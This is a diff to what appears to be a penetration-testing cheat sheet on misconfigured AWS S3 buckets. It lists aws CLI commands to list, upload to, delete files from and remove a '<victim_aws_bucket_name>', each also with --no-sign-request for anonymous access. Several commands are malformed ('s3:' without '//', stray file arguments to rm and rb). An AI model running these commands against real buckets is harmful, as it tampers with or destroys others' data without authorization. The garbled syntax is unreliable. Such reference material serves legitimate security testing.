@@ -11,21 +11,25 @@ Buckets are used to store objects, which consist of data and metadata that descr
 
 #### list aws bucket
 - aws s3 ls s3://<victim_aws_bucket_name>
+
 ***with no creds***
 - aws s3 ls s3://<victim_aws_bucket_name> --no-sign-request
 
 #### file upload 
 - echo "test" >> file.txt
 - aws s3 cp file.txt s3:<victim_aws_bucket_name>/file.txt 
+
 ***with no creds***
 - aws s3 cp file.txt s3:<victim_aws_bucket_name>/file.txt  --no-sign-request
 
 #### file remove
-- aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt  
+- aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt
+  
 ***with no creds***
 - aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt  --no-sign-request
 
 #### bucket remove
 - aws s3 rb file.txt s3:<victim_aws_bucket_name>
+
 ***with no creds***
 - aws s3 rb file.txt s3:<victim_aws_bucket_name>  --no-sign-request
